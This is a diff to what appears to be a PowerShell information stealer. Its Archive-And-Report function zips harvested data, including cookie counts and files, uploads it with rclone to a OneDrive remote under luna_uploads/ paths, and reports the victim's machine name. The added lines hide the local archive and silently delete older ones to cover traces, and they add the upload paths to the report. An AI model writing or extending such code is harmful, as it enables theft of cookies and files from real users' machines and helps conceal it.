@@ -330,6 +330,16 @@ function Archive-And-Report {
 
         & "$PSScriptRoot\rclone.exe" copy "$zipPath" "onedrive:luna_uploads/$user/$timestamp/" --config "$PSScriptRoot\rclone.conf" --quiet
 
+            try {
+                (Get-Item $zipPath).Attributes += 'Hidden'
+                Get-ChildItem "$env:USERPROFILE" -Filter "luna_*.zip" |
+                    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-2) } |
+                    Remove-Item -Force -ErrorAction SilentlyContinue
+            } catch {
+                Write-Warning "Failed to hide or clean old archives: $_"
+            }
+
+
         if ($LASTEXITCODE -ne 0) {
             try {
                 $stream = [System.IO.File]::OpenRead($zipPath)
@@ -373,6 +383,8 @@ Machine: $env:COMPUTERNAME
 Time: $timestamp
 Files: $filesCount
 Cookies: $cookiesCount
+Cloud path: onedrive:luna_uploads/$user/$timestamp/
+Local archive: $zipPath
 "@
 
         $json = @{ text = $summary } | ConvertTo-Json -Compress
